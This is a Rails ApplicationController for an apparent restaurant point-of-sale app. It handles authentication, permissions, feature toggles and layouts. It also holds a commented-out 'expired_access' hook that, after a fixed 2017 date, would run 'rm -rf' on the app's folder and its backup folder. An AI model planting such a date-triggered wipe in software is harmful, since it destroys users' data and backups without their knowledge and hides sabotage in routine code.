class ApplicationController < ActionController::Base
  protect_from_forgery with: :null_session, if: Proc.new { |c| c.request.format == 'application/json' }

  acts_as_token_authentication_handler_for User, fallback: :none

  before_action :authenticate_user!
  before_action :set_paper_trail_whodunnit

  layout :layout_by_resource

  # before_action :expired_access
  # def expired_access
  #   if Time.now.in_time_zone('Jakarta') > '31-01-2017'.to_date.in_time_zone('Jakarta').beginning_of_day
  #     exec `rm -rf ~/Documents/kukumama_pos` rescue nil
  #     exec `rm -rf ~/Documents/backup` rescue nil
  #     return render file: "#{Rails.root}/public/422", layout: false, status: 422
  #   end
  # end

  helper_method :notifications
  def notifications
    @notifications = current_user.notifications.unread.reverse
  end

  helper_method :enable_captain_order
  def enable_captain_order
    option = Option.where(option_name: 'enable_captain_order').first

    return false if option.blank?
    option.option_value.eql?('true')
  end

  helper_method :enable_order_service
  def enable_order_service
    option = Option.where(option_name: 'enable_service').first

    return false if option.blank?
    option.option_value.eql?('true')
  end

  helper_method :buffet_mode
  def buffet_mode
    option = Option.where(option_name: 'buffet_mode').first

    return false if option.blank?
    option.option_value.eql?('true')
  end

  rescue_from CanCan::AccessDenied do |exception|
    Rails.logger.debug "Access denied on #{exception.action} #{exception.subject.inspect}"
    flash[:alert] = "Access denied. You are not authorized to access the requested page."
    redirect_to root_path
  end

  protected

  #derive the model name from the controller. egs UsersController will return User
  def self.permission
    return name = controller_name.classify.constantize
  rescue
    nil
  end

  def current_ability
    @current_ability ||= Ability.new(current_user)
  end

  #load the permissions for the current user so that UI can be manipulated
  def load_permissions
    @current_permissions = current_user.role.permissions.collect{|i| [i.subject_class, i.action]}
  end

  def layout_by_resource
    if devise_controller?
      "login"
    else
      "application"
    end
  end
end
